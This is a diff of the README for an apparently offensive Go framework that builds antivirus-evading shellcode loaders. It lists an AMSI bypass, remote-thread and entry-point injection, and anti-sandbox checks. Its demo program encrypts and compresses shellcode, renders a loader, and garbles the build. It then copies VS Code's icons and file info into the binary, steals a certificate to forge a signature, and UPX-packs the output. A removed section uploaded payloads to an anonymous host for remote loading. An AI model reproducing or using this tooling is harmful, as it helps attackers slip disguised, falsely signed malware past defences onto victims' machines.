@@ -4,15 +4,89 @@ Golang Malware Framework
 
 ## Description
 
-本项目会不断添加各种免杀的技术，但是**不适合直接不做任何修改的编译和使用**，即使是有随机特征的编译
+本项目会不断添加各种免杀的技术，但是不适合直接不做任何修改的编译和使用，即使是有随机特征的编译
 
-### 特别说明
+## Preparation
 
-1. 本项目没有 `GUI` 版本，**使用方法查看demo文件夹**
-2. 学习Go免杀的代码集合，顺手做了模块化处理，**实际开发未结束，还在持续更新**
-3. 最好的免杀效果需要自行修改渲染编译模板
+### Msys2
 
-### 更新日志
+[Download | Msys2](https://www.msys2.org/)
+
+### Update Msys2 Repo
+
+[Msys2 | Tsinghua Open Source Mirror](https://mirrors.tuna.tsinghua.edu.cn/help/msys2/)
+
+```cmd
+// 更新本地软件包数据库，但不安装或更新任何软件包
+pacman -Sy
+
+// 更新软件包数据库，并且更新系统中所有已安装的包，确保系统保持最新状态
+pacman -Syu 
+
+// 只更新已安装的包，而不更新软件包数据库，通常在数据库已经同步的情况下使用
+pacman -Su 
+```
+
+### Compilation Environment
+
+```cmd
+pacman -S mingw-w64-x86_64-gcc
+
+// pass
+pacman -S  mingw-w64-x86_64-toolchain
+
+// pass
+pacman -S mingw-w64-x86_64-gtk3
+
+// pass
+pacman -S  mingw-w64-x86_64-glade
+```
+
+### System Environment Variables
+
+MINGW_HOME
+
+```
+D:\msys64\mingw64
+```
+
+C_INCLUDE_PATH
+
+```
+%MINGW_HOME%\include
+```
+
+LIBRARY_PATH
+
+```
+%MINGW_HOME%\lib
+```
+
+Path
+
+```
+%MINGW_HOME%\bin;
+```
+
+## xwindows
+
+下载并置于项目根目录
+
+xwindows | https://github.com/C1ph3rX13/xwindows
+
+## Initialize
+
+[Run initialize.bat](https://github.com/C1ph3rX13/variant/blob/main/initialize.bat) to initialize
+
+### Changelog
+
+### 2024.12.19
+
+1. `hook`，新增`AMSIByPass()`，进程选择`powershell.exe`即可
+2. `crypto`，新增中文加密`Buddha()`
+3. `sandbox`，新增时区判断`IsBeijingTimezone()`
+4. 新增`inject`注入模块，`AddressOfEntryPointInject()`、`CreatRemoteThreadInject()`
+5. TODO：删除`wdll`模块，使用衍生库 [C1ph3rX13 | xwindows](https://github.com/C1ph3rX13/xwindows)
 
 ### 2024.10.18
 
@@ -273,30 +347,24 @@ func (tOpts TmplOpts) TmplRender() error {}
 7. 模板更新
 8. 反沙箱模块
 
-### TODO
-
-1. + [x] 动态`key, iv`
-2. + [ ] 熵控制
-3. + [ ] 隐藏导入表
-
 ## Tmpl Struct
 
 动态模板支持
 
 ```go
 type Data struct {
-	CipherText    string      // 保存加密文本的变量名
-	PlainText     string      // 保存解密文本的变量名
-	DecryptMethod string      // 解密方法
-	Pokemon       interface{} // Pokemon Shellcode
-	Loader        interface{} // loader
-	SandBox       interface{} // 反沙箱模块
-	Local         interface{} // 本地加载模块
-	Remote        interface{} // 远程加载模块
-	Args          interface{} // 参数加载模块
-	Compressor    interface{} // 压缩算法模块
-	Apart         interface{} // 分离加载模块
-	Dynamic       interface{} // 动态数据
+	CipherText string      // 保存加密文本的变量名
+	PlainText  string      // 保存解密文本的变量名
+	DLLibrary  interface{} // Dynamic Link Library - DLL
+	Pokemon    interface{} // Pokemon 加载模式
+	Loader     interface{} // 加载器
+	SandBox    interface{} // 反沙箱模块
+	Local      interface{} // 本地加载模块
+	Remote     interface{} // 远程加载模块
+	Args       interface{} // 参数加载模块
+	Compressor interface{} // 压缩算法模块
+	Apart      interface{} // 分离加载模块
+	Dynamic    interface{} // 动态数据
 }
 ```
 
@@ -312,7 +380,7 @@ set GOPRIVATE=*
 set GOGARBLE=* 
 ```
 
-### 编译器支持
+### Compiler Support
 
 ```go
 // 基础参数：ldflags="-s -w -H=windowsgui" -trampath
@@ -350,7 +418,7 @@ func (c CompileOpts) GarbleCompile() error {
 	// 上传远程加载的Payload到第三方
 	cUrl := remote.Transfer{
 		Src:   params.FileName,
-		Path:  "D:\\variant\\output\\",
+		Path:  "path to output",
 		Proxy: "192.168.31.10:2080",
 	}
 	// 设置远程加载渲染模板
@@ -402,8 +470,6 @@ func (c CompileOpts) GarbleCompile() error {
 
 ## Demo
 
-动态加载数据
-
 ```go
 package main
 
@@ -411,11 +477,11 @@ import (
 	"fmt"
 	"strings"
 	"variant/build"
+	"variant/compress"
 	"variant/crypto"
-	"variant/dynamic"
-	"variant/enc"
+	"variant/encoder"
+	"variant/gores"
 	"variant/log"
-	"variant/network"
 	"variant/rand"
 	"variant/render"
 )
@@ -424,72 +490,70 @@ func main() {
 	// 反沙箱模块
 	sandbox := render.SandBox{
 		Methods: []string{
-			"sandbox.BootTime",
 			"sandbox.GetDesktopFiles",
+			"sandbox.BootTimeGetTime",
 		}}
 
-	dy := render.Dynamic{
-		Import:        "variant/dynamic", 	// 导入库
-		DynamicUrl:    dynamic.CtIcoUrl,    // 动态 key
-		DynamicMethod: "dynamic.GetIcoHex", // 动态获取 key
-		DynamicKey:    rand.RStrings(), 	// 随机变量名
-		KeyStart:      0, 					// 动态获取 key 起始区间
-		KeyEnd:        8, 					// 动态获取 key 结束区间
-		DynamicIV:     rand.RStrings(), 	// 随机变量名
-		IVStart:       10,					// 动态获取 IV 起始区间
-		IVEnd:         18,					// 动态获取 IV 起始区间
-	}
-
-	loader := render.Loader{
-		Method: "loader.UuidFromStringLoad", // 加载器
-		Hide:   "loader.HideConsoleW32",	 // 隐藏执行窗口 
+	// 压缩算法模块
+	compressor := render.Compressor{
+		Import:    "variant/compress",
+		Algorithm: "compress.LzwDecompress",
+		Ratio:     8,
 	}
 
 	// 设置加密参数
-	params := enc.Payload{
-		PlainText: "render/templates/payload.bin", // raw shellcode
-		FileName:  rand.RStrings(),  			   // 随机变量名
-		Path:      "output",					   // 加密后的 shellcode 输出文件夹
-		Key:       dynamic.GetIcoHex(dy.DynamicUrl, dy.KeyStart, dy.KeyEnd), // 动态 key 加密 shellcode
-		IV:        dynamic.GetIcoHex(dy.DynamicUrl, dy.IVStart, dy.IVEnd),   // 动态 IV 加密 shellcode
+	params := encoder.Payload{
+		PlainText: "output/calc.bin",
+		FileName:  rand.RStrings(),
+		Path:      "output",
+		Key:       rand.LByteStrings(16),
+		IV:        rand.LByteStrings(16),
 	}
-	// 加密之后的 shellcode
-	payload, _ := params.SetKeyIV(crypto.XorSm4HexBase85Encrypt) // 传入加密方法，根据加密方法的签名渲染模板
-	_ = params.WriteStrings(payload)
-
-	// 上传远程加载的Payload到第三方
-	fi := network.FileIO{
-		Path: "output",			// 加密后的 shellcode 输出文件夹
-		Src:  params.FileName,  // 加密后的 shellcode 文件名称
+	// 读取shellcode，返回加密之后的 strings
+	payload, err := params.SetKeyIV(crypto.XorAesHexBase85Encrypt) // 传入加密方法，根据加密方法的签名渲染模板
+	if err != nil {
+		log.Fatal(err)
 	}
 
-	// 设置远程加载渲染模板
-	remoteSet := render.Remote{
-		Import: "variant/network",    // 导入库
-		Method: "network.FileIORead", // 动态读取 shellcode 方法
-		Url:    fi.FileIOUpload(),    // 上传 shellcode 到匿名临时空间
+	// 压缩算法
+	payload, _ = compress.LzwCompress([]byte(payload), 8)
+
+	// 本地加载需要的数据
+	local := render.Local{
+		Payload:      payload,
+		KeyName:      rand.RStrings(),
+		KeyValue:     string(params.Key),
+		IvName:       rand.RStrings(),
+		IvValue:      string(params.IV),
+		MainLocal:    rand.RStrings(),
+		DecryptLocal: "crypto.XorAesHexBase85Decrypt",
+	}
+
+	load := render.Loader{
+		Import: "variant/loader",
+		Method: "loader.EnumerateLoadedModulesLoad",
 	}
 
 	// 定义模板渲染数据
 	data := render.Data{
-		CipherText:    rand.RStrings(), // 随机变量名
-		PlainText:     rand.RStrings(), // 随机变量名
-		DecryptMethod: "crypto.XorSm4HexBase85Decrypt", // 解密方法
-		Loader:        loader,     // 加载器
-		Dynamic:       dy,     	   // 动态数据配置
-		Remote:        remoteSet,  // 远程加载配置
-		SandBox:       sandbox,    // 反沙箱配置
+		CipherText: rand.RStrings(),
+		PlainText:  rand.RStrings(),
+		Loader:     load,
+		Local:      local,
+		SandBox:    sandbox,
+		Compressor: compressor,
+		//Args:          args,
 	}
 
 	// 设置模板的渲染参数
 	tOpts := render.TmplOpts{
-		TmplFile:     "render/templates/v4/Base.tmpl", // 指定模板文件
-		OutputDir:    "output",						   // 模板编译文件位置
-		OutputGoName: fmt.Sprintf("%s.go", rand.RStrings()), // 模板文件名称
-		Data:         data, // 加载器数据
+		TmplFile:     "render/templates/v6/Base.tmpl",
+		OutputDir:    "output",
+		OutputGoName: fmt.Sprintf("%s.go", rand.RStrings()),
+		Data:         data,
 	}
 	// 生成模板
-	err := render.TmplRender(tOpts)
+	err = tOpts.TmplRender()
 	if err != nil {
 		log.Fatal(err)
 	}
@@ -500,10 +564,11 @@ func main() {
 		ExeFileName: fmt.Sprintf("%s.exe", strings.TrimSuffix(tOpts.OutputGoName, ".go")),
 		HideConsole: false,
 		CompilePath: "output",
-		GSeed:       true,
-		GDebug:      true,
+		BuildMode:   "pie",
 		Literals:    true,
-        Tiny：		true,
+		GSeed:       true,
+		Tiny:        true,
+		GDebug:      true,
 	}
 
 	// 编译
@@ -512,29 +577,42 @@ func main() {
 	}
 
 	// 添加图标和文件信息
-	err = cOpts.Winres()
+	winres := gores.GoWinRes{
+		CompilePath: "output",          // 指定编译目录
+		ExtractFile: "Code.exe",        // 指定提取资源文件的对象
+		ExtractDir:  "",                // 指定提取资源文件后输出的路径
+		PatchFile:   cOpts.ExeFileName, // 指定使用 Patch 添加资源文件的对象
+	}
+
+	// 提取 vscode 所有的资源文件
+	err = winres.Extract()
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	// 使用 Patch 添加资源文件到编译后的程序
+	err = winres.HandleWinRes()
 	if err != nil {
 		log.Fatal(err)
 	}
 
 	// 伪造证书配置
-	sOpts := build.SignOpts{
-		SignPath: "output",
-		UnSign:   cOpts.ExeFileName,
-		Signed:   "signed_" + cOpts.ExeFileName,
-		Cert:     "wps.der",
-		Thief:    "wps.exe",
-		DstCert:  "wps.der",
+	ct := build.CertThief{
+		SignDir: "output",
+		SrcFile: cOpts.ExeFileName,
+		DstFile: "Code.exe",
+		Signed:  fmt.Sprintf("signed_%s", cOpts.ExeFileName),
+		DstCert: "Code.der",
 	}
 
 	// 保存证书
-	err = sOpts.SaveCert()
+	err = ct.CertSaver()
 	if err != nil {
 		log.Fatal(err)
 	}
 
 	// 利用EXE进行签名伪造
-	err = sOpts.ExeThief()
+	err = ct.ExeThief()
 	if err != nil {
 		log.Fatal(err)
 	}
@@ -547,20 +625,21 @@ func main() {
 
 	// 压缩参数
 	upx := build.UpxOpts{
-		Level:   "-9",
+		Level:   "--lzma",
 		Keep:    true,
 		Force:   true,
-		SrcExe:  cOpts.ExeFileName,
-		UpxPath: "output",
+		SrcExe:  ct.Signed,
+		SrcPath: "output",
+		UpxPath: "build",
 	}
 
-	// 压缩
+	// 执行压缩
 	err = upx.UpxPacker()
 	if err != nil {
-		log.Warn(err)
+		log.Fatal(err)
 	}
-
 }
+
 ```
 
 ### Thanks
@@ -580,3 +659,5 @@ https://github.com/TideSec/GoBypassAV
 https://github.com/Pizz33/GobypassAV-shellcode
 
 https://github.com/timwhitez/Doge-Gabh
+
+https://github.com/MrTuxx/OffensiveGolang
